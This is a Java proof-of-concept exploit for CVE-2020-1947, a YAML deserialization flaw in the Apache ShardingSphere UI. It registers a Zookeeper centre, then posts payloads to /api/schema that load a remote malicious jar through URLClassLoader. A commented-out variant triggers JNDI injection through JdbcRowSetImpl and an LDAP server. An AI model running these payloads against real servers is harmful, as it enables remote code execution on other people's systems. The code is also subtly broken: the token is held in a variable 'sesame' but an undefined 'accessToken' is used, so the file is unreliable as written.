package com.threedr3am.bug.shardingsphere.ui;

import com.threedr3am.bug.common.server.LdapServer;
import java.io.UnsupportedEncodingException;
import java.util.Random;
import java.util.concurrent.Executors;
import org.apache.http.HttpEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.impl.client.HttpClients;


/**
 * @author threedr3am
 */
public class Poc {

  public static void main(String[] args) throws UnsupportedEncodingException, InterruptedException {
    String target = "http://localhost:8088";
    String sesame = "eyJCSodqY5GuRZV9UsCPnLIPSolidMIob8rclkKvXsPHCORhkjKyReFEF3r1WdP6oeKoQlJAWSu2YqpayzM9FdS9ROG6XZGpEIF7VHqdFZZ4KJy0CAR9TWFcDVb6UOTlKXepSGi6XFb6CBM6CXb9UCC4HAA4WSB4QOk2RPc1TGQpUZFwMEc1WIT6TST2HLDuOSLdVPv9NCG3Myg3UHXiVzMwGDvpTmv3NEEjLNf7DNs2Iwq0FZwhLNRlJLqbNAz3JTCsDmP9WRLxLTn8KMbzBlf4KNL4Ess7WhlySMKmMHSoHgdmUKObMwxaSYG9EtslFuQzCVZwEuNmGeGiZardLEZkZrRuUDOpLlXnJIOxRexaYhJpPfRjTKLeATTMM0TeQx1KJYU8Rm23UF2fIH88FZ5qXH9fUN93KM0vSR63UX62FX00UU36KP39DY7sRQ0uTC11TN09OR47OE31PG0mNX30KS58TB99YF2gJV68QD08GE54VH77EO0uDZ85YD99DO47YZ06SY04OU8wAZ0jUM52OG8dEK2hAX34BE3uKN3aRC4iNU71FSh9QV96CGX2HW17ZELuOAD7XXm3NDtmCTu4SXK7NNMbSIC4LTAlHRf9QFelOD87XU48IX19ZW1gJV" + "8hGE71NB1zUMCuLIm0UGJfEsp4XMKxXqufUUMgEZqxIWDoJcRsSDFbEGBkTuOmAvmrVPaaFVFoGwHyIpNlBDPnMOttNGYnYaTkJGstEMhnELJkNKDpWRllQGSvRMAtEkegDHCyUXlzFDVbPksgLPmuYXAoAMThHpJiACmdMHadTuLhSySzNyOaRiQfNzigWLgjDZWcKYZyASidUNKgAwYhJScgJzZwOwDvAtadQDVlTMABMIc0s3t5FpvjIAUMGibHelpBIiIVTcs9OCXTgLAgTnKvRTSWIBdhKgWeJJY2HRKKdMCPQNY1T6MDfXbNtSmwNaGmGcUEBijSwJjVWpGKKg6wJ3PgWgukWbtBzemZQ86IRELxLdjzSzZRBbAoRBiipU3OKPm5cusBITVnKvu5bLedBRN9dCM4irFPl4SVcNL7ugZsC9DCE5JyVDDNtcfUXJJimJsDCrg3BNs4DLqrNfI0dRobBASED2Mjt5Q2cKiNNNGqDarrA2h3HietTiRhyL4Pk7BdKbvodE0ayR0cDkZuFXknOBnWETHUaECry5tSKhvINWKjOxy5XGYgRQ8tQSRFw6SGZbtKGFrrUY6gU3XbiZOlPGfGLIwwvBradRR5I5onTon1PDUGM0KillZFOjouFoLKJlHsnyVVFUMZMBdaE1QMEM8tlRXCsPyAGDG2oEJyOMprBra3BHNlzcAxisCeWed5KKQZcS9lwGx3ElIIWkYULMthpNCXxMW8kRGngzfLAr5GYRMwWwOJC9fxYsn8WXJ2b49wMtBSgAFBZUpzZea3ZNGBY3PljLfCuncSDfSkD2riXLhje8qNJFYqJfYYSD4Yb0GWiSATWwJ3PGWvIjjnWRX3h19xVeroHagaDA6jtx1EuUCNuXHyVjrrAL9dTip9DLUcdInfeedETGr0WlyEIJJrO1wIR0Z6lFHhBZ8Ver29EZKqtwnzVgVDEe89o5A7AMxjN8IpLee0STNBE7ZnSpy5VZQjumtgXhUnUfLrhpqxT0f3FgA9t33gLdcwrI0FQxZ7pxleMG5YaZ2yURKDkDUPPS1AvJBTXoC0JSy0BWWVW7YmYYZCKsKdOjBdVwo0eAtiRuY6GhV3TN4UbR3cGTShNriiTjWdKwFGXhiEIIQJQV9HXpCQTqsxTec1JFU4w60IBn0WbAJvKEP2VZBtS0frSXOnSTP0JrRqVeKaQsu4YCboEDoJYN34TNXoMSNHKvnfendMDq13TnmOPtXBuBnOTVguDynAtWZsNgsnPHg7QhtCO2pFBSmaOzmbI5HRWdSrQbRLYK0CIMV9RlQ5TS6cFWC0KlCmKPxyeuC9BWq6Fo6icDZ0NNb_PKn4HrcxTCA3VkLUHQM2UDK7Sci9wIboYIj0lc97vVZjNjwNCtg5XYYkzWKXCTAev3PVej8XEXW3Cv3wBcV6EGtvFJCeAt0Mf3E1OI8aTnOMie4gPDfvE9qPc5oYNZ8bQglnObVfZhY_LGklYJwZASBeGxIQRvf6cKitG04FVyFJMlXlye89pFoIJgXBQ5sNifBnUyrNTDRidD6OJ8RLJTUhGZ0yzGl7UwB0Kau8lJosKUnASh7gOBYFGwCXBWAZWCOtGJYhT8u9GXI2IkD2n48cRqX1cW1qwRpwE4wgAuOPKk4EUKAUD4V4Vm4kooi9HuATWGWtEkWYH2gARNiVo5phBJQlIjo7ZQV0wPWdAix2mobiscGkK8llNnB5dAGIfe1vZpSGTaxyV6BKXB5zVD3SN12qp9g2RVI3WdK1zNLfbIB2LxLdLex1KLMag1famWIiFHHkJiwDS6VhX0eEN4OXMTBqTlMhKc5AYEMagW70T8chSYMoXPagDen6DKAEBHMihrHOGDkFIhQfHrKmBqKrBQ9SHTFrBLCrXI4IAUJveMysX6YXUIKoRLlcLog9FVYnnaBlj5lvM5KhDuH6e7kaKFPNJWcDkSokQRNaIQ4ByQBBEowzcWKkNaiSWmyOPBOOcq9uUCOtg9KBRnq1fPedOUwuDqUQFQrvsi5TIauPYioQcAOIAjBpUgGLkGazYIkISmNvjDKaxnBQJHW3Mmk8pFewL2dtLhcOiTebkZ1Jp5RzHsj5bnKztYE9bBURwKjDNNVbM9TSMq3XXSMyYou6UCHWJNXYUihVDGGrTt9WVRF3i24hCbCAxC9UrRvtGhdjMYELTw6OAZAdODgAUBdKd6hABVXzME4BVcf7sPhiCPtHVO8pyLrXGxXDq7nUWCU6e31jSexlKm3jtFCXMUGzS8GdYl9tlMhlEskOXzaBbCkvFKwDL5qjFKDiGJ1zyvX9YRegYao5APIRG5PxTcHGC1CaFyWqvlXmD95znLdVkRbtGrYkTT7dR5eiH7AoMiLaWeGoFUOxTux7HMDIq4DjtGslk7qxAs2CENRXvQDoVR7pWuFYAktaTiZ9J7ntVzs3FnLMDaBaPFuZi7W6IFcYOYxqGE6df73QRipjVum4GNPMG8emrOwVJSPmYnWER6LjIQSbR2J6M6uUsBKVY9qRV4FXSym0eAlpC9Curb0vGEQuSkAJmBBsIae7JRLGIZgvJHTxTHINUwAAx0lnXFfBzPXpR2omdseQIgBENKclLBTwVRygBud4DXODlQOlX5PnWyQ2ZwdYsIrcYLHZI2RBr1xYc1SnSiVmT7E_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";
    String zookeeperURL = "127.0.0.1:2181";

    initData(target, accessToken, zookeeperURL);

    //todo payload-1：恶意jar包 payload，参考 common这个module 的CalcScriptEngineFactory类，以及其SPI注册文件META-INF/services/javax.script.ScriptEngineFactory
    String evilJar = "http://127.0.0.1:80/common-1.0-SNAPSHOT.jar";
    attack(target, accessToken, evilJar);

    //todo payload-2：使用jndi注入 payload
    String evilLdapServer = "ldap://127.0.0.1:43658/Calc";
//    Executors.newSingleThreadExecutor().execute(() -> LdapServer.run());
//    Thread.sleep(3000L);
//    attack2(target, accessToken, evilLdapServer);
  }

  private static void attack(String target, String accessToken, String evilJar)
      throws UnsupportedEncodingException {
    String payload;
    HttpPost httpPost;
    HttpEntity httpEntity;

    //todo 添加scheme，反序列化RCE
    payload = "'111': !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ['" + evilJar + "']]]]";
    payload = "{\"name\":\"CVE-2020-1947(" + new Random().nextInt(10000) + ")\",\"ruleConfiguration\":\"name: 111\\nmasterDataSourceName: 222\\nloadBalanceAlgorithmType: 333\\nslaveDataSourceNames: [111,222]\",\"dataSourceConfiguration\":\"" + payload + "\"}";
    httpPost = new HttpPost(target + "/api/schema");
    httpPost.addHeader("Access-Token", accessToken);
    httpEntity = new StringEntity(payload, "application/json", "utf-8");
    httpPost.setEntity(httpEntity);
    try {
      HttpClientBuilder httpClientBuilder = HttpClients
          .custom()
          .disableCookieManagement()
          .disableAuthCaching()
          .disableRedirectHandling()
          ;
      CloseableHttpClient httpClient = null;
      CloseableHttpResponse response = null;
      try {
        httpClient = httpClientBuilder.build();
        response = httpClient.execute(httpPost);
      } finally {
        response.close();
        httpClient.close();
      }
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  private static void attack2(String target, String accessToken, String evilLdapServer)
      throws UnsupportedEncodingException {
    String payload;
    HttpPost httpPost;
    HttpEntity httpEntity;

    //todo 添加scheme，反序列化RCE
    payload = "!!com.sun.rowset.JdbcRowSetImpl\\n   dataSourceName: " + evilLdapServer + "\\n   autoCommit: true";
    payload = "{\"name\":\"CVE-2020-1947(" + new Random().nextInt(10000) + ")\",\"ruleConfiguration\":\"name: 111\\nmasterDataSourceName: 222\\nloadBalanceAlgorithmType: 333\\nslaveDataSourceNames: [111,222]\",\"dataSourceConfiguration\":\"" + payload + "\"}";
    httpPost = new HttpPost(target + "/api/schema");
    httpPost.addHeader("Access-Token", accessToken);
    httpEntity = new StringEntity(payload, "application/json", "utf-8");
    httpPost.setEntity(httpEntity);
    try {
      HttpClientBuilder httpClientBuilder = HttpClients
          .custom()
          .disableCookieManagement()
          .disableAuthCaching()
          .disableRedirectHandling()
          ;
      CloseableHttpClient httpClient = null;
      CloseableHttpResponse response = null;
      try {
        httpClient = httpClientBuilder.build();
        response = httpClient.execute(httpPost);
      } finally {
        response.close();
        httpClient.close();
      }
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  private static void initData(String target, String accessToken, String zookeeperURL)
      throws UnsupportedEncodingException, InterruptedException {
    String name = String.valueOf(new Random().nextInt(10000));
    //todo 创建注册中心
    String payload = "{\"digest\":\"\",\"name\":\"CVE-2020-1947(" + name + ")\",\"namespace\":\"threedr3am\",\"orchestrationName\":\"threedr3am\",\"registryCenterType\":\"Zookeeper\",\"serverLists\":\"" + zookeeperURL + "\"}";
    HttpPost httpPost = new HttpPost(target + "/api/reg-center");
    httpPost.addHeader("Access-Token", accessToken);
    HttpEntity httpEntity = new StringEntity(payload, "application/json", "utf-8");
    httpPost.setEntity(httpEntity);
    try {
      HttpClientBuilder httpClientBuilder = HttpClients
          .custom()
          .disableAuthCaching()
          .disableCookieManagement()
          .disableRedirectHandling()
          ;
      CloseableHttpClient httpClient = null;
      CloseableHttpResponse response = null;
      try {
        httpClient = httpClientBuilder.build();
        response = httpClient.execute(httpPost);
      } finally {
        response.close();
        httpClient.close();
      }
    } catch (Exception e) {
      e.printStackTrace();
    }

    //todo 连接注册中心
    payload = "{\"name\":\"CVE-2020-1947(" + name + ")\"}";
    httpPost = new HttpPost(target + "/api/reg-center/connect");
    httpPost.addHeader("Access-Token", accessToken);
    httpEntity = new StringEntity(payload, "application/json", "utf-8");
    httpPost.setEntity(httpEntity);
    try {
      HttpClientBuilder httpClientBuilder = HttpClients
          .custom()
          .disableAuthCaching()
          .disableCookieManagement()
          .disableRedirectHandling()
          ;
      CloseableHttpClient httpClient = null;
      CloseableHttpResponse response = null;
      try {
        httpClient = httpClientBuilder.build();
        response = httpClient.execute(httpPost);
      } finally {
        response.close();
        httpClient.close();
      }
    } catch (Exception e) {
      e.printStackTrace();
    }
  }
}
